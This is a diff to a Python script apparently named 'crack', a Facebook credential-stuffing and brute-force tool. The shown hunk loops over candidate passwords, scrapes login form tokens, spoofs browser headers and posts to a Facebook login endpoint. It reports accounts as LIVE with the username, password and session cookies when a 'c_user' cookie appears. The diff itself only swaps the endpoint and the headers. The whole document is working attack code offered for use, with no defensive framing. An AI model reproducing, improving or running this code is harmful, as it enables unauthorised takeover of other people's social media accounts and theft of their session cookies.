@@ -441,31 +441,30 @@ class crack:
 		for pw in peweh:
 		    try:
 			ses=requests.Session()
-			link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
-			data = {
-			    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-			    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-			    "uid": user,
-			    "next": "https://m.facebook.com/login/save-device/",
-			    "flow": "login_no_pin",
-			    "pass": pw
+			link = ses.get(f"https://{url_log}/login.php?next=https%3A%2F%2F{url_log}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr")
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',
+			str(link.text)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', 
+			str(link.text)).group(1),
+			"email":user,
+			"pass":pw,
+			"next":""
 			}
-			head = {
-			    "cache-control": "max-age=0",
-			    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-			    "sec-ch-ua": "'Chromium';v='107', 'Not=A?Brand';v='24'",
-			    "sec-ch-ua-mobile": "?0",
-			    "sec-ch-ua-platform": '"Linux"',
-			    "sec-fetch-site": "none",
-			    "sec-fetch-mode": "navigate",
-			    "sec-fetch-user": "?1",
-			    "sec-fetch-dest": "document",
-			    "upgrade-insecure-requests": "1",
-			    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
-			    "accept-encoding": "gzip, deflate, br",
-			    "accept-language": "id-ID,id;q=0.9"
+			head = {'accept': '*/*',
+			'accept-encoding': 'gzip, deflate, br', 
+			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+			'content-type': 'application/x-www-form-urlencoded','Host': url_log,
+			'origin': 'https://'+url_log,
+			'referer': 'https://'+url_log+'/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&refsrc=de1precated&_rdr',
+			'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+			'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
+			'sec-ch-ua-mobile': '?0',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-origin',
+			'x-requested-with': 'XMLHttpRequest'
 			}
-			xnxx = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=head, allow_redirects=False)
+			xnxx = ses.post(f'https://{url_log}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date)
 			if "c_user" in ses.cookies.get_dict():
 			    coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 			    print(f"\r[ {H}LIVE{N} ] {user}|{pw}")
